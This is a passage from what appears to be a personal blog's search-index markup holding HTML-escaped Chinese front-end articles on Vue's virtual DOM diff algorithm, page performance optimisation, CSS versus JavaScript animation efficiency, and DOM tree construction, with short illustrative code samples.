    oldVnode.key === newVnode.key &amp;amp;&amp;amp; // key值是否一样
    oldVnode.tagName === newVnode.tagName &amp;amp;&amp;amp; // 标签名是否一样
    oldVnode.isComment === newVnode.isComment &amp;amp;&amp;amp; // 是否都为注释节点
    isDef(oldVnode.data) === isDef(newVnode.data) &amp;amp;&amp;amp; // 是否都定义了data
    sameInputType(oldVnode, newVnode) // 当标签为input时，type必须是否相同
  )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;patchvnode方法&#34;&gt;patchVnode方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;找到对应的&lt;code&gt;真实DOM&lt;/code&gt;，称为&lt;code&gt;el&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;判断&lt;code&gt;newVnode&lt;/code&gt;和&lt;code&gt;oldVnode&lt;/code&gt;是否指向同一个对象，如果是，那么直接&lt;code&gt;return&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果他们都有文本节点并且不相等，那么将&lt;code&gt;el&lt;/code&gt;的文本节点设置为&lt;code&gt;newVnode&lt;/code&gt;的文本节点。&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;oldVnode&lt;/code&gt;有子节点而&lt;code&gt;newVnode&lt;/code&gt;没有，则删除&lt;code&gt;el&lt;/code&gt;的子节点&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;oldVnode&lt;/code&gt;没有子节点而&lt;code&gt;newVnode&lt;/code&gt;有，则将&lt;code&gt;newVnode&lt;/code&gt;的子节点真实化之后添加到&lt;code&gt;el&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果两者都有子节点，则执行&lt;code&gt;updateChildren&lt;/code&gt;函数比较子节点，这一步很重要&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function patchVnode(oldVnode, newVnode) {
  const el = newVnode.el = oldVnode.el // 获取真实DOM对象
  // 获取新旧虚拟节点的子节点数组
  const oldCh = oldVnode.children, newCh = newVnode.children
  // 如果新旧虚拟节点是同一个对象，则终止
  if (oldVnode === newVnode) return
  // 如果新旧虚拟节点是文本节点，且文本不一样
  if (oldVnode.text !== null &amp;amp;&amp;amp; newVnode.text !== null &amp;amp;&amp;amp; oldVnode.text !== newVnode.text) {
    // 则直接将真实DOM中文本更新为新虚拟节点的文本
    api.setTextContent(el, newVnode.text)
  } else {
    // 否则

    if (oldCh &amp;amp;&amp;amp; newCh &amp;amp;&amp;amp; oldCh !== newCh) {
      // 新旧虚拟节点都有子节点，且子节点不一样

      // 对比子节点，并更新
      updateChildren(el, oldCh, newCh)
    } else if (newCh) {
      // 新虚拟节点有子节点，旧虚拟节点没有

      // 创建新虚拟节点的子节点，并更新到真实DOM上去
      createEle(newVnode)
    } else if (oldCh) {
      // 旧虚拟节点有子节点，新虚拟节点没有

      //直接删除真实DOM里对应的子节点
      api.removeChild(el)
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;updatechildren方法&#34;&gt;updateChildren方法&lt;/h3&gt;
&lt;p&gt;用于新旧虚拟节点的&lt;strong&gt;子节点&lt;/strong&gt;对比，用&lt;strong&gt;首尾指针法&lt;/strong&gt;来实现&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;ul&amp;gt;
    &amp;lt;li&amp;gt;a&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;b&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;c&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;

修改数据后

&amp;lt;ul&amp;gt;
    &amp;lt;li&amp;gt;b&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;c&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;e&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;a&amp;lt;/li&amp;gt;
&amp;lt;/ul
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;新旧两个子节点集合以及其首尾指针为：&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874725928.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后会进行互相进行比较，总共有五种比较情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1、&lt;code&gt;oldS 和 newS&lt;/code&gt; 使用&lt;code&gt;sameVnode方法&lt;/code&gt;进行比较，&lt;code&gt;sameVnode(oldS, newS)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;2、&lt;code&gt;oldS 和 newE&lt;/code&gt; 使用&lt;code&gt;sameVnode方法&lt;/code&gt;进行比较，&lt;code&gt;sameVnode(oldS, newE)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;3、&lt;code&gt;oldE 和 newS&lt;/code&gt; 使用&lt;code&gt;sameVnode方法&lt;/code&gt;进行比较，&lt;code&gt;sameVnode(oldE, newS)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;4、&lt;code&gt;oldE 和 newE&lt;/code&gt; 使用&lt;code&gt;sameVnode方法&lt;/code&gt;进行比较，&lt;code&gt;sameVnode(oldE, newE)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;5、如果以上逻辑都匹配不到，再把所有旧子节点的 &lt;code&gt;key&lt;/code&gt; 做一个映射到旧节点下标的 &lt;code&gt;key -&amp;gt; index&lt;/code&gt; 表，然后用新 &lt;code&gt;vnode&lt;/code&gt; 的 &lt;code&gt;key&lt;/code&gt; 去找出在旧节点中可以复用的位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874718161.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;第一步&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-swift&#34;&gt;oldS = a, oldE = c
newS = b, newE = a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比较结果：&lt;code&gt;oldS 和 newE&lt;/code&gt; 相等，需要把&lt;code&gt;节点a&lt;/code&gt;移动到&lt;code&gt;newE&lt;/code&gt;所对应的位置，也就是末尾，同时&lt;code&gt;oldS++&lt;/code&gt;，&lt;code&gt;newE--&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874711888.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;第二步&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-swift&#34;&gt;oldS = b, oldE = c
newS = b, newE = e
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比较结果：&lt;code&gt;oldS 和 newS&lt;/code&gt;相等，需要把&lt;code&gt;节点b&lt;/code&gt;移动到&lt;code&gt;newS&lt;/code&gt;所对应的位置，同时&lt;code&gt;oldS++&lt;/code&gt;,&lt;code&gt;newS++&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874706873.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;第三步&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-swift&#34;&gt;oldS = c, oldE = c
newS = c, newE = e
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比较结果：&lt;code&gt;oldS、oldE 和 newS&lt;/code&gt;相等，需要把&lt;code&gt;节点c&lt;/code&gt;移动到&lt;code&gt;newS&lt;/code&gt;所对应的位置，同时&lt;code&gt;oldS++&lt;/code&gt;,&lt;code&gt;oldE--&lt;/code&gt;,&lt;code&gt;newS++&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874701093.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;第四步&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;oldS &amp;gt; oldE&lt;/code&gt;，则&lt;code&gt;oldCh&lt;/code&gt;先遍历完成了，而&lt;code&gt;newCh&lt;/code&gt;还没遍历完，说明&lt;code&gt;newCh比oldCh多&lt;/code&gt;，所以需要将多出来的节点，插入到真实DOM上对应的位置上&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874695514.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;p&gt;如果是&lt;code&gt;newCh&lt;/code&gt;先遍历完，那么&lt;code&gt;oldCh&lt;/code&gt;中多出的节点将会被删除&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;平常v-for循环渲染的时候，为什么&lt;strong&gt;不建议用index&lt;/strong&gt;作为循环项的key呢？&lt;/p&gt;
&lt;p&gt;如下例子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;ul&amp;gt;                      &amp;lt;ul&amp;gt;
    &amp;lt;li key=&amp;quot;0&amp;quot;&amp;gt;a&amp;lt;/li&amp;gt;        &amp;lt;li key=&amp;quot;0&amp;quot;&amp;gt;林三心&amp;lt;/li&amp;gt;
    &amp;lt;li key=&amp;quot;1&amp;quot;&amp;gt;b&amp;lt;/li&amp;gt;        &amp;lt;li key=&amp;quot;1&amp;quot;&amp;gt;a&amp;lt;/li&amp;gt;
    &amp;lt;li key=&amp;quot;2&amp;quot;&amp;gt;c&amp;lt;/li&amp;gt;        &amp;lt;li key=&amp;quot;2&amp;quot;&amp;gt;b&amp;lt;/li&amp;gt;
                              &amp;lt;li key=&amp;quot;3&amp;quot;&amp;gt;c&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;                     &amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样用index做key会导致li标签全要更新一遍&lt;/p&gt;
&lt;p&gt;在进行子节点的 &lt;code&gt;diff算法&lt;/code&gt; 过程中，会进行 旧首节点和新首节点的&lt;code&gt;sameNode&lt;/code&gt;对比，这一步命中了逻辑，因为现在&lt;code&gt;新旧两次首部节点&lt;/code&gt; 的 &lt;code&gt;key&lt;/code&gt; 都是 &lt;code&gt;0&lt;/code&gt;了，同理，key为1和2的也是命中了逻辑，导致&lt;code&gt;相同key的节点&lt;/code&gt;会去进行&lt;code&gt;patchVnode&lt;/code&gt;更新文本，而原本就有的&lt;code&gt;c节点&lt;/code&gt;，却因为之前没有key为4的节点，而被当做了新节点&lt;/p&gt;
&lt;p&gt;所以就建议用独一无二的值来作为&lt;code&gt;key&lt;/code&gt;值&lt;/p&gt;
">虚拟DOM：虚拟DOM和实际的DOM有何不同？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/xing-neng-ru-he-xi-tong-di-you-hua/"" data-c="
          &lt;p&gt;&lt;strong&gt;谈论的⻚⾯优化，其实就是要让⻚⾯更快地显⽰和响应。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通常⼀个⻚⾯有三个阶段：&lt;strong&gt;加载阶段&lt;/strong&gt;、&lt;strong&gt;交互阶段&lt;/strong&gt;和&lt;strong&gt;关闭阶段&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加载阶段，是指从发出请求到渲染出完整⻚⾯的过程，影响到这个阶段的主要因素有⽹络和JavaScript脚 本。&lt;/li&gt;
&lt;li&gt;交互阶段，主要是从⻚⾯加载完成到⽤⼾交互的整合过程，影响到这个阶段的主要因素是JavaScript脚 本。&lt;/li&gt;
&lt;li&gt;关闭阶段，主要是⽤⼾发出关闭指令后⻚⾯所做的⼀些清理操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;加载阶段&#34;&gt;加载阶段&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629786689712.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在构建DOM的过程中需要HTML和JavaScript⽂件，在构造渲染树的过程中需要⽤到CSS⽂件。&lt;/p&gt;
&lt;p&gt;而Javascript和CSS文件请求造成网页阻塞，&lt;strong&gt;我们把这些能阻塞⽹⻚⾸次渲染的资源称为关键资源。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;三个影响⻚⾯ ⾸次渲染的核⼼因素。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第⼀个是关键资源个数&lt;/strong&gt;。关键资源个数越多，⾸次⻚⾯的加载时间就会越⻓。⽐如上图中的关键资源个数就 是3个，1个HTML⽂件、1个JavaScript和1个CSS⽂件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第⼆个是关键资源⼤⼩&lt;/strong&gt;。通常情况下，所有关键资源的内容越⼩，其整个资源的下载时间也就越短，那么阻 塞渲染的时间也就越短。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三个是请求关键资源需要多少个RTT（Round Trip Time）&lt;/strong&gt;，&lt;strong&gt;RTT是往返时延。它是网络中的一个重要的性能指标&lt;/strong&gt;。通常一个HTTP的数据包在14KB左右，所以一个0.1MB大小的页面需要拆分为8个包，也就是需要8个RTT。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;总的优化原则就 是减少关键资源个数，降低关键资源⼤⼩，降低关键资源的RTT次数&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;如何减少关键资源的个数&#34;&gt;如何减少关键资源的个数？&lt;/h3&gt;
&lt;p&gt;⼀种⽅式是可以将JavaScript和CSS改成内联的形式，这样可以减少关键资源的请求个数。&lt;/p&gt;
&lt;p&gt;如果JavaScript代 码没有DOM或者CSSOM的操作，则可以改成sync或者defer属性。&lt;/p&gt;
&lt;p&gt;对于CSS，如果不是在构建⻚⾯之 前加载的，则可以添加媒体取消阻⽌显现的标志。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;如何减少关键资源的大小&#34;&gt;如何减少关键资源的⼤⼩？&lt;/h3&gt;
&lt;p&gt;可以压缩CSS和JavaScript资源，移除HTML、CSS、JavaScript⽂件中⼀些注 释内容&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;如何减少关键资源rtt的次数&#34;&gt;如何减少关键资源RTT的次数？&lt;/h3&gt;
&lt;p&gt;可以通过减少关键资源的个数和减少关键资源的⼤⼩搭配来实现。除此之 外，还可以使⽤CDN来减少每次RTT时⻓。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;交互阶段&#34;&gt;交互阶段&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629786696644.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如果在计算样式阶段发现有布局信息的修改，那么就会触发&lt;strong&gt;重排&lt;/strong&gt;操作，然后触发后续渲染流⽔线的⼀系列操 作，这个代价是⾮常⼤的。&lt;/p&gt;
&lt;p&gt;如果在计算样式阶段没有发现有布局信息的修改，只是修改了颜⾊⼀类的信息，那么就不会涉及到布局 相关的调整，所以可以跳过布局阶段，直接进⼊绘制阶段，这个过程叫&lt;strong&gt;重绘&lt;/strong&gt;。不过重绘阶段的代价也是不⼩ 的。&lt;/p&gt;
&lt;p&gt;通过CSS实现⼀些变形、渐变、动画等特效，这是由CSS触发的，并且是在合成线程上 执⾏的，这个过程称为&lt;strong&gt;合成&lt;/strong&gt;。&lt;strong&gt;通过CSS实现⼀些变形、渐变、动画等特效，这是由CSS触发的，并且是在合成线程上 执⾏的，这个过程称为合成。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;在交互阶段渲染流⽔线中有哪些因素影响了帧的⽣成速度以及 如何去优化&lt;/p&gt;
&lt;h3 id=&#34;减少javascript脚本执行时间&#34;&gt;减少JavaScript脚本执⾏时间&lt;/h3&gt;
&lt;p&gt;有时JavaScript函数的⼀次执⾏时间可能有⼏百毫秒，这就严重霸占了主线程执⾏其他渲染任务的时间。针 对这种情况我们可以采⽤以下两种策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;⼀种是将⼀次执⾏的函数分解为多个任务，使得每次的执⾏时间不要过久。&lt;/li&gt;
&lt;li&gt;另⼀种是采⽤Web Workers。你可以把Web Workers当作主线程之外的⼀个线程，在Web Workers中是可 以执⾏JavaScript脚本的，不过Web Workers中没有DOM、CSSOM环境，这意味着在Web Workers中是⽆法通过JavaScript来访问DOM的，所以我们可以把⼀些和DOM操作⽆关且耗时的任务放到Web Workers中去执⾏。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总之，在交互阶段，对JavaScript脚本总的原则就是不要⼀次霸占太久主线程。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;避免强制同步布局&#34;&gt;避免强制同步布局&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;所谓强制同步布局，是指JavaScript强制将计算样式和布局操作提前到当前的任务中。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function foo() {
    let main_div = document.getElementById(&amp;quot;mian_div&amp;quot;)
    let new_node = document.createElement(&amp;quot;li&amp;quot;)
    let textnode = document.createTextNode(&amp;quot;time.geekbang&amp;quot;)
    new_node.appendChild(textnode);
    document.getElementById(&amp;quot;mian_div&amp;quot;).appendChild(new_node);
    //由于要获取到offsetHeight，
    //但是此时的offsetHeight还是⽼的数据，
    //所以需要⽴即执⾏布局操作
    console.log(main_div.offsetHeight)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将新的元素添加到DOM之后，我们⼜调⽤了main_div.offsetHeight来获取新main_div的⾼度信息。 如果要获取到main_div的⾼度，就需要重新布局，所以这⾥在获取到main_div的⾼度之前，JavaScript还 需要强制让渲染引擎默认执⾏⼀次布局操作。我们把这个操作称为强制同步布局。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;避免布局抖动&#34;&gt;避免布局抖动&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;所谓布局抖动，是指在⼀次JavaScript执⾏过程 中，多次执⾏强制布局和抖动操作。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function foo() {
    let time_li = document.getElementById(&amp;quot;time_li&amp;quot;)
    for (let i = 0; i &amp;lt; 100; i++) {
    let main_div = document.getElementById(&amp;quot;mian_div&amp;quot;)
    let new_node = document.createElement(&amp;quot;li&amp;quot;)
    let textnode = document.createTextNode(&amp;quot;time.geekbang&amp;quot;)
    new_node.appendChild(textnode);
    new_node.offsetHeight = time_li.offsetHeight;
    document.getElementById(&amp;quot;mian_div&amp;quot;).appendChild(new_node);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;for循环语句⾥⾯不断读取属性值，每次读取属性值之前都要进⾏计算样式和布局。&lt;/p&gt;
&lt;p&gt;在foo函数内部重复执⾏计算样式和布局，这会⼤⼤影响当前函数的执⾏效率&lt;/p&gt;
&lt;p&gt;这种情况 的避免⽅式和强制同步布局⼀样，都是尽量不要在修改DOM结构时再去查询⼀些相关值。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;合理利用css合成动画&#34;&gt;合理利⽤CSS合成动画&lt;/h3&gt;
&lt;p&gt;合成动画是直接在合成线程上执⾏的，这和在主线程上执⾏的布局、绘制等操作不同，如果主线程被 JavaScript或者⼀些布局任务占⽤，CSS动画依然能继续执⾏。&lt;/p&gt;
&lt;p&gt;如果能提前知道对某个元素执⾏动画操作，那就最好将其标记为will-change，这是告诉渲染引擎需 要将该元素单独⽣成⼀个图层。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;在加载阶段，核⼼的优化原则是：优化关键资源的加载速度，减少关键资源的个数，降低关键资源的RTT次数。&lt;/p&gt;
&lt;p&gt;在交互阶段，核⼼的优化原则是：尽量减少⼀帧的⽣成时间。可以通过减少单次JavaScript的执⾏时间、避 免强制同步布局、避免布局抖动、尽量采⽤CSS的合成动画&lt;/p&gt;
">⻚⾯性能：如何系统地优化⻚⾯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/wei-shi-me-css-dong-hua-javascriptxiao/"" data-c="
          &lt;p&gt;DOM树⽣成之后，还要经历布局、分层、绘制、合成、显⽰等阶段后才能显⽰出漂亮的⻚⾯。&lt;/p&gt;
&lt;h2 id=&#34;显示器是怎么显示图像的&#34;&gt;显⽰器是怎么显⽰图像的&lt;/h2&gt;
&lt;p&gt;每个显⽰器都有固定的刷新频率，通常是60HZ，也就是每秒更新60张图⽚，更新的图⽚都来⾃于显卡中⼀ 个叫&lt;strong&gt;前缓冲区&lt;/strong&gt;的地⽅，显⽰器所做的任务很简单，就是每秒固定读取60次前缓冲区中的图像，并将读取的图 像显⽰到显⽰器上。&lt;/p&gt;
&lt;h2 id=&#34;显卡&#34;&gt;显卡&lt;/h2&gt;
&lt;p&gt;显卡的职责就是合成新的图像，并将图像保存到后缓冲区中，⼀旦显卡把合成的图像写到后缓冲区，系统就 会让后缓冲区和前缓冲区互换，这样就能保证显⽰器能读取到最新显卡合成的图像&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;如何生成一帧图像&#34;&gt;如何⽣成⼀帧图像&lt;/h2&gt;
&lt;p&gt;有&lt;strong&gt;重排&lt;/strong&gt;、&lt;strong&gt;重绘&lt;/strong&gt;和&lt;strong&gt;合成&lt;/strong&gt;三种⽅式。&lt;/p&gt;
&lt;p&gt;通常渲染路径越⻓，⽣成图像花费的时间就越多。⽐如重排，它需要重新 根据CSSOM和DOM来计算布局树，这样⽣成⼀幅图⽚时，会让整个渲染流⽔线的每个阶段都执⾏⼀遍，如 果布局复杂的话，就很难保证渲染的效率了。⽽重绘因为没有了重新布局的阶段，操作效率稍微⾼点，但是 依然需要重新计算绘制信息，并触发绘制操作之后的⼀系列操作。&lt;/p&gt;
&lt;p&gt;相较于重排和重绘，&lt;strong&gt;合成&lt;/strong&gt;操作的路径就显得⾮常短了，并不需要触发布局和绘制两个阶段，如果采⽤了 GPU，那么合成的效率会⾮常⾼。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;分层和合成&#34;&gt;分层和合成&lt;/h2&gt;
&lt;p&gt;通常⻚⾯的组成是⾮常复杂的，有的⻚⾯⾥要实现⼀些复杂的动画效果，⽐如点击菜单时弹出菜单的动画特 效，滚动⿏标滚轮时⻚⾯滚动的动画效果，当然还有⼀些炫酷的3D动画特效。&lt;strong&gt;如果没有采⽤分层机制，从 布局树直接⽣成⽬标图⽚的话&lt;/strong&gt;，那么每次⻚⾯有很⼩的变化时，都会触发重排或者重绘机制，这种“牵⼀发 ⽽动全⾝”的绘制策略会严重影响⻚⾯的渲染效率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了提升每帧的渲染效率，Chrome引⼊了分层和合成的机制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以把⼀张⽹⻚想象成是由&lt;strong&gt;很多个图⽚叠加在⼀起的，每个图⽚就对应⼀个图层&lt;/strong&gt;，Chrome合成器最终将 这些图层合成了⽤于显⽰⻚⾯的图⽚。&lt;/p&gt;
&lt;p&gt;将素材分解为多个图层的操作就称为&lt;strong&gt;分层&lt;/strong&gt;，最后将这些图层合并到⼀起的操作就称为&lt;strong&gt;合成&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;分层体现在⽣成布局树之后&lt;/strong&gt;，渲染引擎会根据布局树的特点将其转换为层树 （Layer Tree），层树是渲染流⽔线后续流程的基础结构。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;层树&lt;/strong&gt;的每一个子节点对应的都是一个图层，接着的绘制阶段就在这些子节点上进行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;绘制阶段&lt;/strong&gt;其实就是生成一个&lt;strong&gt;绘制指令列表&lt;/strong&gt;，真正的渲染阶段在光栅化阶段&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;光栅化阶段&lt;/strong&gt;是真正的将图层进行合成并且会将页面分块，我们所看到的视图（viewport）是优先进行的，并且chorme采用首次合成图块的时候采用低分辨率的图片，可以大幅度加快渲染速度。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;合成操作是在合成线程上完成的，这也就意味着在执⾏合成操作时，是不会影响到主线 程执⾏的&lt;/strong&gt;。这就是为什么经常主线程卡住了，但是CSS动画依然能执⾏的原因&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;如何利用分层技术优化代码&#34;&gt;如何利⽤分层技术优化代码&lt;/h2&gt;
&lt;p&gt;对某个元素做⼏何形状变换、透明度变换或者⼀些缩放操作，如果使 ⽤JavaScript来写这些效果，会牵涉到整个渲染流⽔线，所以JavaScript的绘制效率会⾮常低下。&lt;/p&gt;
&lt;p&gt;这时可以使⽤ &lt;code&gt;will-change&lt;/code&gt;来告诉渲染引擎你会对该元素做⼀些特效变换，CSS代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;.box {
will-change: transform, opacity;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码就是提前告诉渲染引擎box元素将要做⼏何变换和透明度变换操作，这时候渲染引擎会将该元素单 独实现⼀帧，等这些变换发⽣时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就⼤⼤提升了渲染的效率。&lt;strong&gt;这也是CSS动画⽐JavaScript动画⾼效的原因&lt;/strong&gt;。&lt;/p&gt;
">为什么CSS动画⽐JavaScript⾼效？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/dom-shu-javascript-shi-ru-he-ying-xiang-dom-shu-gou-jian-de/"" data-c="
          &lt;h2 id=&#34;什么是dom&#34;&gt;什么是DOM&lt;/h2&gt;
&lt;p&gt;从⽹络传给渲染引擎的HTML⽂件字节流是⽆法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理 解的内部结构，这个结构就是DOM。&lt;/p&gt;
&lt;p&gt;DOM有三个 层⾯的作⽤。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从⻚⾯的视⻆来看，DOM是⽣成⻚⾯的基础数据结构。&lt;/li&gt;
&lt;li&gt;从JavaScript脚本视⻆来看，DOM提供给JavaScript脚本操作的接⼝，通过这套接⼝，JavaScript可以对 DOM结构进⾏访问，从⽽改变⽂档的结构、样式和内容。&lt;/li&gt;
&lt;li&gt;从安全视⻆来看，DOM是⼀道安全防护线，⼀些不安全的内容在DOM解析阶段就被拒之⻔外了。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;dom树如何生成&#34;&gt;DOM树如何⽣成&lt;/h2&gt;
&lt;p&gt;在渲染引擎内部，有⼀个叫&lt;strong&gt;HTML解析器&lt;/strong&gt;（HTMLParser）的模块，它的职责就是负责将HTML字节流转换 为DOM结构。&lt;/p&gt;
&lt;p&gt;HTML解析器并不是等整个⽂档加载完成之后再解析的，⽽是&lt;strong&gt;⽹络进程加载了多少数据，HTML解析器便解析多少数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;⽹络进程接收到响应头之后，会根据请求头中的content-type字段来判断⽂件的 类型，⽐如content-type的值是“text/html”，那么浏览器就会判断这是⼀个HTML类型的⽂件，然后为该 请求选择或者创建⼀个渲染进程。&lt;/p&gt;
&lt;p&gt;渲染进程准备好之后，⽹络进程和渲染进程之间会建⽴⼀个共享数据的管 道，⽹络进程接收到数据后就往这个管道⾥⾯放，⽽渲染进程则从管道的另外⼀端不断地读取数据，并同时 将读取的数据“喂”给HTML解析器。HTML解析器它会动态接收字节流，并将其解析为DOM。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;第⼀个阶段，通过分词器将字节流转换为Token。后续的第⼆个和第三个阶段是同步进⾏的，需要将Token解析为DOM节点，并将DOM节点添加到DOM 树中&lt;/p&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
	&amp;lt;body&amp;gt;
		&amp;lt;div&amp;gt;1&amp;lt;/div&amp;gt;
		&amp;lt;div&amp;gt;test&amp;lt;/div&amp;gt;
	&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
	
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;HTML解析器开始⼯作时，会默认创建了⼀个根为document的空DOM结构，同时 会将⼀个StartTag document的Token压⼊栈底。然后经过分词器解析出来的第⼀个StartTag html Token会 被压⼊到栈中，并创建⼀个html的DOM节点，添加到document上&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1629548369483.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
